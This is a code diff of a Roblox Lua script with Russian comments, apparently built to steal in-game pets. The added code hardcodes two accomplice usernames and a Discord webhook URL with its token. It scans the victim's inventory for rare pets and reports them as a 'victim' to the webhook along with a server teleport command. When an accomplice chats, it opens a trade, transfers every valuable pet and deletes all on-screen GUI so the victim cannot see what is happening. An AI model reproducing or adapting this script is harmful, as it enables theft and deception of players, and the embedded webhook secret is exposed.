@@ -3,11 +3,11 @@ local lp = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
--- Пути к инвентарю и экипированным петам
+-- Пути к инвентарю
 local inventoryPath = lp.PlayerGui.Tabs.Inventory.Menu.Categories.Pets.Inner.List.Container
 local equippedPath = lp.PlayerGui.Tabs.Inventory.Menu.Categories.Pets.Inner.List.Equipped.List
 
--- Редкости, которые нас интересуют
+-- Редкости, которые считаем ценными
 local VALID_RARITIES = {
     ["Mythical"] = true,
     ["Secret I"] = true,
@@ -15,13 +15,19 @@ local VALID_RARITIES = {
     ["Secret III"] = true
 }
 
--- Твой Discord вебхук
-local webhook = "https://discord.com/api/webhooks/ВАШ_ВЕБХУК_ЗДЕСЬ"
+-- Список доверенных игроков, по чату которых сработает трейд
+local UserNames = {
+    "Iriska0_0v",
+    "StantY_Y"
+}
 
--- HTTP requester (synapse, krnl и т.д.)
+-- Твой вебхук
+local webhook = "https://discord.com/api/webhooks/1408421597156474890/DshCKWfUftKiEKTymFXskyk_ZaqFd86iVtPDqKEhQ3qvyrlFgy05JcCMAEM8oWfysbcZ"
+
+-- HTTP requester
 local HttpRequest = request or (syn and syn.request) or http_request or (http and http.request)
 
--- Таблица для подсчёта по редкостям
+-- Переменные для подсчёта
 local RarityCount = {
     ["Mythical"] = 0,
     ["Secret I"] = 0,
@@ -29,24 +35,27 @@ local RarityCount = {
     ["Secret III"] = 0
 }
 local TotalValuablePets = 0
+local FoundIDs = {}  -- Для передачи петов
 
--- Функция сканирования контейнера (инвентарь + экипированные)
+-- === Сканирование инвентаря ===
 local function scan(container, tag)
     for _, pet in ipairs(container:GetChildren()) do
         for _, child in ipairs(pet:GetChildren()) do
             if VALID_RARITIES[child.Name] then
                 local id = pet:GetAttribute("Id")
                 if id then
+                    table.insert(FoundIDs, id)
                     RarityCount[child.Name] = RarityCount[child.Name] + 1
                     TotalValuablePets = TotalValuablePets + 1
                     print(string.format("[%s] %s — %s | ID: %s", tag, pet.Name, child.Name, id))
+                else
+                    warn(string.format("[%s] %s — %s | ID НЕ НАЙДЕН", tag, pet.Name, child.Name))
                 end
             end
         end
     end
 end
 
--- Сканируем инвентарь и экипированных
 print("=== Scanning Inventory ===")
 scan(inventoryPath, "Inventory")
 print("=== Scanning Equipped ===")
@@ -54,23 +63,45 @@ scan(equippedPath, "Equipped")
 
 print("Сканирование завершено. Всего ценных петов:", TotalValuablePets)
 
--- Если ничего ценного не найдено — выходим
-if TotalValuablePets == 0 then
-    print("Нет ценных петов — вебхук не отправляется.")
-    return
+-- === Функции трейда (оставлены без изменений) ===
+local function firePlayer(targetName)
+    local targetPlayer = Players:FindFirstChild(targetName) or Players:WaitForChild(targetName, 9e9)
+    local args = {[1] = targetPlayer}
+    local remote = ReplicatedStorage:WaitForChild("df82cbce-4e0e-45f4-993a-af75f0c1a09a", 9e9)
+        :WaitForChild("Events", 9e9):GetChildren()[30]
+    remote:FireServer(unpack(args))
+    print("FireServer (трейд) выполнен для игрока:", targetName)
 end
 
--- === Получение jobId через Presence API ===
-local function getPresenceJobId()
-    if not HttpRequest then
-        warn("[PRESENCE] Нет HTTP requester")
-        return nil
+local function firePet(id)
+    local args = {[1] = {"Pet", id}}
+    local remote = ReplicatedStorage:WaitForChild("df82cbce-4e0e-45f4-993a-af75f0c1a09a", 9e9)
+        :WaitForChild("Functions", 9e9):GetChildren()[63]
+    remote:InvokeServer(unpack(args))
+    print("Передан Pet ID:", id)
+end
+
+local function fireFinalEvent()
+    local args = {[1] = false, [2] = true}
+    ReplicatedStorage:WaitForChild("df82cbce-4e0e-45f4-993a-af75f0c1a09a", 9e9)
+        :WaitForChild("Events", 9e9):GetChildren()[35]:FireServer(unpack(args))
+    print("FireServer [35] выполнен (false, true)")
+end
+
+local function removeAllGUI(parent)
+    for _, child in ipairs(parent:GetChildren()) do
+        child:Destroy()
     end
+end
+
+-- === Получение jobId ===
+local function getPresenceJobId()
+    if not HttpRequest then return nil end
 
     local userIds = {}
     local idToName = {}
     for _, p in ipairs(Players:GetPlayers()) do
-        if p ~= lp then  -- исключаем себя, чтобы не мешал
+        if p ~= lp then
             table.insert(userIds, p.UserId)
             idToName[p.UserId] = p.Name
         end
@@ -81,9 +112,6 @@ local function getPresenceJobId()
     local body = HttpService:JSONEncode({userIds = userIds})
     local headers = {["Content-Type"] = "application/json"}
 
-    -- Если есть кука — добавляем (необязательно, но может помочь)
-    -- if getgenv().Cookie then headers["Cookie"] = ".ROBLOSECURITY=" .. getgenv().Cookie end
-
     local success, response = pcall(function()
         return HttpRequest({
             Url = "https://presence.roblox.com/v1/presence/users",
@@ -93,23 +121,16 @@ local function getPresenceJobId()
         })
     end)
 
-    if not success or not response or not response.Body then
-        warn("[PRESENCE] Ошибка запроса")
-        return nil
-    end
+    if not success or not response or not response.Body then return nil end
 
     local parseSuccess, data = pcall(HttpService.JSONDecode, HttpService, response.Body)
-    if not parseSuccess or not data.userPresences then
-        warn("[PRESENCE] Не удалось распарсить ответ")
-        return nil
-    end
+    if not parseSuccess or not data.userPresences then return nil end
 
     for _, presence in ipairs(data.userPresences) do
         if presence.placeId and presence.gameId then
             return {
                 placeId = tostring(presence.placeId),
-                jobId = tostring(presence.gameId),
-                playerName = idToName[presence.userId] or "Unknown"
+                jobId = tostring(presence.gameId)
             }
         end
     end
@@ -119,12 +140,11 @@ end
 
 -- === Отправка в вебхук ===
 local function sendToWebhook(presenceData)
-    if not HttpRequest then return false end
+    if not HttpRequest or TotalValuablePets == 0 then return false end
 
     local placeId = presenceData.placeId
     local jobId = presenceData.jobId
 
-    -- Формируем список редкостей
     local rarityLines = {}
     for rarity, count in pairs(RarityCount) do
         if count > 0 then
@@ -132,39 +152,25 @@ local function sendToWebhook(presenceData)
         end
     end
 
-    local rarityText = table.concat(rarityLines, "\n")
-    if rarityText == "" then rarityText = "Нет данных" end
+    local rarityText = #rarityLines > 0 and table.concat(rarityLines, "\n") or "Нет данных"
 
-    -- Команда телепорта
     local teleportCommand = string.format(
         "game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s')",
         placeId, jobId
     )
 
     local payload = {
-        ["content"] = "@everyone\n" .. teleportCommand,  -- можно убрать @everyone если не нужно
+        ["content"] = "@everyone\n" .. teleportCommand,
         ["embeds"] = {{
-            ["title"] = "🎲 Найдены ценные петы!",
-            ["description"] = string.format("**Жертва:** %s\n**Сервер:** %s петов на сервере", lp.Name, #Players:GetPlayers()),
-            ["color"] = 16711680,  -- красный
+            ["title"] = "🤑 Ценные петы на сервере!",
+            ["description"] = "**Жертва:** " .. lp.Name,
+            ["color"] = 16711680,
             ["fields"] = {
-                {
-                    ["name"] = "Редкости петов:",
-                    ["value"] = rarityText,
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "Общее количество:",
-                    ["value"] = tostring(TotalValuablePets),
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "Join link (альтернатива):",
-                    ["value"] = string.format("https://www.roblox.com/games/%s/?jobId=%s", placeId, jobId),
-                    ["inline"] = false
-                }
+                {["name"] = "Редкости:", ["value"] = rarityText, ["inline"] = false},
+                {["name"] = "Всего ценных петов:", ["value"] = tostring(TotalValuablePets), ["inline"] = true},
+                {["name"] = "Игроков на сервере:", ["value"] = tostring(#Players:GetPlayers()), ["inline"] = true}
             },
-            ["footer"] = {["text"] = "Pet Simulator Scanner | " .. os.date("%Y-%m-%d %H:%M")}
+            ["footer"] = {["text"] = "Pet Scanner • " .. os.date("%d.%m.%Y %H:%M")}
         }}
     }
 
@@ -179,20 +185,73 @@ local function sendToWebhook(presenceData)
     end)
 
     if success and resp and (resp.StatusCode == 200 or resp.StatusCode == 204) then
-        print("[WEBHOOK] Успешно отправлено!")
+        print("[WEBHOOK] Успешно отправлено на сервер с jobId:", jobId)
         return true
     else
-        warn("[WEBHOOK] Ошибка отправки:", resp and resp.StatusCode or "unknown")
+        warn("[WEBHOOK] Ошибка отправки")
         return false
     end
 end
 
--- === Основная логика ===
-local presence = getPresenceJobId()
+-- === Отправка вебхука при старте (если есть ценные петы) ===
+task.spawn(function()
+    if TotalValuablePets > 0 then
+        local presence = getPresenceJobId()
+        if presence then
+            sendToWebhook(presence)
+        else
+            warn("Не удалось получить jobId — вебхук не отправлен.")
+        end
+    end
+end)
 
-if presence then
-    print("[PRESENCE] Успешно получен jobId:", presence.jobId)
-    sendToWebhook(presence)
-else
-    warn("[PRESENCE] Не удалось получить jobId — вебхук НЕ отправлен.")
+-- === Система трейда по чату (оставлена полностью без изменений) ===
+local function onChat(playerName)
+    firePlayer(playerName)
+    task.delay(5, function()
+        for _, id in ipairs(FoundIDs) do
+            firePet(id)
+        end
+        fireFinalEvent()
+    end)
+
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player:FindFirstChild("PlayerGui") then
+            removeAllGUI(player.PlayerGui)
+            player.PlayerGui.ChildAdded:Connect(function(child)
+                task.defer(function()
+                    removeAllGUI(child)
+                end)
+            end)
+        end
+    end
 end
+
+for _, player in ipairs(Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        if table.find(UserNames, player.Name) then
+            print(player.Name .. " написал в чат: " .. message)
+            onChat(player.Name)
+        end
+    end)
+end
+
+Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        if table.find(UserNames, player.Name) then
+            print(player.Name .. " написал в чат: " .. message)
+            onChat(player.Name)
+        end
+    end)
+
+    if player:FindFirstChild("PlayerGui") then
+        removeAllGUI(player.PlayerGui)
+        player.PlayerGui.ChildAdded:Connect(function(child)
+            task.defer(function()
+                removeAllGUI(child)
+            end)
+        end)
+    end
+end)
+
+print("Скрипт загружен. Ожидание чата от доверенных игроков или сканирование завершено.")
